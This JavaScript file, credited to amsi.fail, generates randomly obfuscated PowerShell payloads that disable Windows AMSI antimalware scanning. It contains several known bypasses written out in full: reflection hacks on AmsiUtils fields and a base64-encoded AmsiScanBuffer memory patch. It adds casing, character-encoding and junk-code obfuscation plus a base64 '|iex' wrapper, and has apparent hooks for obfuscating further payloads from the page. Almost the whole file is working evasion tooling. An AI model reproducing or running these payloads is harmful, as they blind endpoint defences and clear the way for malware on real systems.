/*
* Taken from https://amsi.fail
* 
*/


/**
 * Grabs a string, converts it from unicode into a base64 string
 * Reference: https://stackoverflow.com/a/30106551
 * @param {String} UTF-8 string
 * @returns {string} base64-encoded unicode version of string
 */
function toBinary(string) {
  const codeUnits = new Uint16Array(string.length);
  for (let i = 0; i < codeUnits.length; i++) {
    codeUnits[i] = string.charCodeAt(i);
  }
  return btoa(String.fromCharCode(...new Uint8Array(codeUnits.buffer)));
}

/**
 * Returns a random integer between 0 and max exclusive
 * @param {Integer} max value exclusive
 * @returns {Integer} random integer
 */
function randomInt(max) {
  return Math.floor(Math.random() * max);
}

/**
 * Randomly upper- or lowercases the input
 * @param {String} input
 * @returns {String} output the randomly cased input
 */
function randomCase(input){
    // randomize casing
    return input.split('').map((c) => Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase()).join('')
}

/**
 * Returns the ascii value of a char (A => 41)
 * @param {String} char
 * @returns {Integer} returns the ascii value of the input char
 */
function charEncode(char){
    let asciiValue = char.charCodeAt(0)

    return obfuscateInt(asciiValue)
}

/**
 * Encodes a char as a obfucscated "byte" (A => ([byte]0x41))
 * @param {String} char
 * @returns {Integer} returns the obfuscated value as a "byte"
 */
function byteEncode(char){
    const asciiValue = char.charCodeAt(0)

    return `([${randomCase("byte")}]0x${asciiValue.toString(16)})`
}

/**
 * Obfuscate an integer in 4 different ways (eg 41 => (21+20))
 * @param {Integer} int
 * @returns {Integer} returns the obfuscated integer
 */
function obfuscateInt(int){
    const subNumber = randomInt(int-2) + 1 // Avoid divide by zero

    switch (randomInt(4)) {
        case 0:
            return `(${subNumber}+${int - subNumber})`
        case 1:
            return `(${int}+${subNumber}-${subNumber})`
        case 2:
            return `(${int}*${subNumber}/${subNumber})`
        case 3:
            return `(${int})`
    }
    return int
}


/*
* From: https://stackoverflow.com/questions/7033639/split-large-string-in-n-size-chunks-in-javascript
* Splits a string into N sized chunks
* @param {String} str, {Int} size 
* @returns {Array} Chunks of string you split into N (size)
*/
function chunkSubstr(str, size) {
  const numChunks = Math.ceil(str.length / size)
  const chunks = new Array(numChunks)

  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
    chunks[i] = str.substr(o, size)
  }

  return chunks
}



/**
 * Obfuscate a char in 2 different ways (eg "A" => "+[CHAR]41")
 * @param {String} char
 * @returns {String} returns the obfuscated char
 */
function obfuscateChar(char){
    const startChar = "+"
    switch (randomInt(2)) {
        case 0:
            return startChar + "[" + randomCase("CHAR") + "]" + byteEncode(char)
    
        case 1:
            return startChar + "[" + randomCase("CHAR") + "]" + charEncode(char)
    }
}

/**
 * Maps each input char into its diacritic counterpart
 * @param {String} string
 * @returns {String} the obfuscated string
 */
function diacriticEncode(input){
    let encodedString= [...input].map(c => getRandomDiacritic(c.charCodeAt(0))).join('')
    let stringSize= randomInt(encodedString.length-2)
    let encodedArray= chunkSubstr(encodedString,stringSize+1)
    return encodedArray.join('\'+\'')
}

/**
 * Takes an ascii value and tries to find a diacritic for it. If not it returns the char
 * @param {Integer} ascii value of char
 * @returns {String} a diacritic for the char, or just the char
 */
function getRandomDiacritic(asciiValue){
    let min = 0
    let max = 0
    switch (asciiValue){
        case 65:   //A
            min = 192
            max = 197
            return String.fromCharCode(min + randomInt(max - min))
        case 97:  //a
            min = 224
            max = 229
            return String.fromCharCode(min + randomInt(max - min))
        case 73:  //I
            min = 204
            max = 207
            return String.fromCharCode(min + randomInt(max - min))
        case 105:  //i
            min = 236
            max = 239
            return String.fromCharCode(min + randomInt(max - min))
        case 79:  //O
            min = 210
            max = 216
            return String.fromCharCode(min + randomInt(max - min))
        case 69: //E
            min = 236
            max = 239
            return String.fromCharCode(min + randomInt(max - min))
        case 111: //o
            min = 243
            max = 246
            return String.fromCharCode(min + randomInt(max - min))
        default:
            return String.fromCharCode(asciiValue)
    }
}

/**
 * Takes an input string and returns a obfuscated string using obfuscateChar or Diacritics
 * @param {String} input
 * @returns {String} a obfuscated string using obfuscateChar or Diacritics
 */
function obfuscateString(input){



    switch (randomInt(2)) {
        case 0:
            return [...input].map(c => obfuscateChar(c)).join('')
        case 1:
            // FormD obfuscate, we use substring(1) to remove the first +
            let obfuscatedFormD = [..."FormD"].map(c => obfuscateChar(c)).join('').substring(1)
            // pattern obfuscate, we use substring(1) to remove the first +    
            let obfuscatedPattern = [...String.raw`\p{Mn}`].map(c => obfuscateChar(c)).join('').substring(1)

            return `+('${diacriticEncode(input)}').${randomCase("Normalize")}(${obfuscatedFormD}) -replace ${obfuscatedPattern}`
    }


}

/**
 * Obfuscates all strings inside single quotes and contains a list of "mustEncode" values that always will be encoded.
 * @param {String} input
 * @returns {String} a obfuscated version of the input
 */
function encodePayload(input){

    // Find all strings inside single quotes
    const re = /\'(.*?)\'/g

    // obfuscate all strings inside single quotes
    for (const match of input.matchAll(re)) {
        let old = match[0]

        
        if(String(old).startsWith("'http")){
            inputx = old

            input = input.replaceAll(old, inputx)


        }
        else{

            let obf = obfuscateString(old.replaceAll("'", "")).substring(1)
            input = input.replaceAll(old, `$(${obf})`)
        }
    }

    const mustEncode = [
        "amsiContext",
        "amsiSession",
        "AmsiUtils",
        "amsiInitFailed",
        "WriteInt32",
	    "System",
        "Management",
        "Automation"
        
    ]

    for (const word of mustEncode){
        let obf = obfuscateString(word)
        if (word == "amsiInitFailed"){
            obf = `'+$(${obf.substring(1)})+'`
        }else{
            obf = `$(${obf.substring(1)})`
        }





        input = input.replaceAll(word, obf)
    }

    input = input.replace(";", ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+");")
    
    let nullValue = randomCase(randomString(randomInt(10)))

    input = input.replace("$null","$" + nullValue)

    input + ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+")"

    input=  input.replace(";;","")
    return input.replace("\n","\n$" + nullValue + "=$null;")
}


/**
 * Obfuscates all strings inside single quotes and contains a list of "mustEncode" values that always will be encoded.
 * @param {String} input
 * @returns {String} a obfuscated version of the input
 */
function encodePayload2(input){

    // Find all strings inside single quotes
    const re = /\'(.*?)\'/g

    // obfuscate all strings inside single quotes
    for (const match of input.matchAll(re)) {
        let old = match[0]

        
        if(String(old).startsWith("'http")){
            inputx = old

            input = input.replaceAll(old, inputx)


        }
        else{

            let obf = obfuscateString(old.replaceAll("'", "")).substring(1)
            input = input.replaceAll(old, `$(${obf})`)
        }
    }

    const mustEncode = [
        "amsiContext",
        "amsiSession",
        "AmsiUtils",
        "amsiInitFailed",
        "WriteInt32",
        "Management",
        "Automation"
        
    ]

    for (const word of mustEncode){
        let obf = obfuscateString(word)
        if (word == "amsiInitFailed"){
            obf = `'+$(${obf.substring(1)})+'`
        }else{
            obf = `$(${obf.substring(1)})`
        }





        input = input.replaceAll(word, obf)
    }

    input = input.replace(";", ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+");")
    
    let nullValue = randomCase(randomString(randomInt(10)))

    input = input.replace("$null","$" + nullValue)

    input + ";$" + getRandomJunk() + "=\"" + obfuscateString(getRandomJunk())+ "\";[Threading.Thread]::Sleep(" +randomInt(2000)+")"

    input=  input.replace(";;","")
    return input.replace("\n","\n$" + nullValue + "=$null;")
}


/**
 * creates a random junk 
 * @param {Integer} length
 * @returns {String} random string of a given length
 */
 function getRandomJunk(){
    let length = randomInt(30) 
    const alphabet = "abcdefghijklmnopqrstuvwxyz"
    let ret = ""
    for(var i=0; i < length; i++){
        ret += alphabet[Math.floor(Math.random() * alphabet.length)]
    }
    return ret
}


/**
 * creates a random a-z string of given input length
 * @param {Integer} length
 * @returns {String} random string of a given length
 */
function randomString(length){
    const alphabet = "abcdefghijklmnopqrstuvwxyz"
    let ret = ""
    for(var i=0; i < length; i++){
        ret += alphabet[Math.floor(Math.random() * alphabet.length)]
    }
    return ret
}

/**
 * A special function for encoding the RastaMouse AMSI-bypass.
 * @param {String} RastaMouse AMSI-bypass
 * @returns {String} a obfuscated version of the input
 */
function encodeRasta(input){
    const mustEncode = [
        "AmsiScanBuffer",
        "amsi.dll"
    ]

    const varsToEncode = [
        "Win32",
        "LibLoad",
        "MemAdr",
        "Patch",
        "var1",
        "var2",
        "var3",
        "var4",
        "var5",
        "var6",
        "dwSize"
    ]

    for (let word of varsToEncode){
        let newword = randomString(word.length)
        input = input.replaceAll(word, newword)
    }

    for (let word of mustEncode){
        let obf = obfuscateString(word)
        obf = `$(${obf.substring(1)})`
        input = input.replaceAll(word, obf)
    }

    return input
}

/**
 * Randomly select a payload and encode it
 * @returns {String} a obfuscated random AMSI bypass
 */
function getPayload(){
    let memvar = randomString(3 + randomInt(7));
    const ForceErrer = `$${memvar}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(${obfuscateInt(9076)});[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiSession\", \"NonPublic,Static\").SetValue($null, $null);[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiContext\", \"NonPublic,Static\").SetValue($null, [IntPtr]$${memvar});`
    const MattGRefl = `$${memvar}=\"System.Management.Automation.AmsiUtils\";[Ref].Assembly.GetType($${memvar}).GetField('amsiInitFailed',\"NonPublic,Static\").SetValue($null,$true);`;
    const MattGReflLog = `$${memvar}=\"System.Management.Automation.AmsiUtils\";[Delegate]::CreateDelegate((\"Func\`\`3[String, $(([String].Assembly.GetType('System.Reflection.BindingFlags')).FullName), System.Reflection.FieldInfo]\" -as [String].Assembly.GetType('System.Type')), [Object]([Ref].Assembly.GetType($${memvar})),('GetField')).Invoke('amsiInitFailed',((\"NonPublic,Static\") -as [String].Assembly.GetType('System.Reflection.BindingFlags'))).SetValue($null,$True);`;
    const MattGref02 = `$${memvar}=\"System.Management.Automation.AmsiUtils\";[Runtime.InteropServices.Marshal]::(\"WriteInt32\")([Ref].Assembly.GetType($${memvar}).GetField(\"amsiContext\",[Reflection.BindingFlags]\"NonPublic,Static\").GetValue($null),0x${randomInt(2147483647).toString(16)});`
    const RastaBuf = atob("I1Jhc3RhLW1vdXNlcyBBbXNpLVNjYW4tQnVmZmVyIHBhdGNoIFxuDQokV2luMzIgPSBAIg0KdXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOw0KcHVibGljIGNsYXNzIFdpbjMyIHsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsNCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIpXQ0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7DQogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0NCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnRQdHIgZHdTaXplLCB1aW50IGZsTmV3UHJvdGVjdCwgb3V0IHVpbnQgbHBmbE9sZFByb3RlY3QpOw0KfQ0KIkANCg0KQWRkLVR5cGUgJFdpbjMyDQoNCiRMaWJMb2FkID0gW1dpbjMyXTo6TG9hZExpYnJhcnkoImFtc2kuZGxsIikNCiRNZW1BZHIgPSBbV2luMzJdOjpHZXRQcm9jQWRkcmVzcygkTGliTG9hZCwgIkFtc2lTY2FuQnVmZmVyIikNCiRwID0gMA0KW1dpbjMyXTo6VmlydHVhbFByb3RlY3QoJE1lbUFkciwgW3VpbnQzMl01LCAweDQwLCBbcmVmXSRwKQ0KJHZhcjEgPSAiMHhCOCINCiR2YXIyID0gIjB4NTciDQokdmFyMyA9ICIweDAwIg0KJHZhcjQgPSAiMHgwNyINCiR2YXI1ID0gIjB4ODAiDQokdmFyNiA9ICIweEMzIg0KJFBhdGNoID0gW0J5dGVbXV0gKCR2YXIxLCR2YXIyLCR2YXIzLCR2YXI0LCskdmFyNSwrJHZhcjYpDQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQYXRjaCwgMCwgJE1lbUFkciwgNik=");
    const OffSec = `$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);`
    switch (randomInt(6)) {
        case 0:
            return encodePayload(ForceErrer)
        case 1:
            return encodePayload(MattGRefl)
        case 2:
            return encodePayload(MattGReflLog)
        case 3:
            return encodePayload(MattGref02)
        case 4:
            return encodeRasta(RastaBuf)
        case 5:
            return encodePayload2(OffSec)
    }
}

function GeneratePS(){
   
   document.getElementById("PowerShellOut").value =  getPayload();            
}

function GenerateEncPS(){
   document.getElementById("PowerShellOut").value =  `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(getPayload())}"))|iex`           
}


function Generate_out(){
    var loc = $("#basic_out").attr('data');
    document.getElementById("basic_out").value = encodePayload2(loc)
}


function Generate_outenc(){
    var loc = $("#basic_out").attr('data');
    document.getElementById("basic_out").value = `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(encodePayload2(loc))}"))|iex` 
}


function Generate_meter(){
     var loc = $("#meter_out").attr('data');
    document.getElementById("meter_out").value = encodePayload2(loc)
}


function Generate_meterenc(){
     var loc = $("#meter_out").attr('data');
    document.getElementById("meter_out").value = `${randomCase("[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(")}"${toBinary(encodePayload2(loc))}"))|iex` 
}









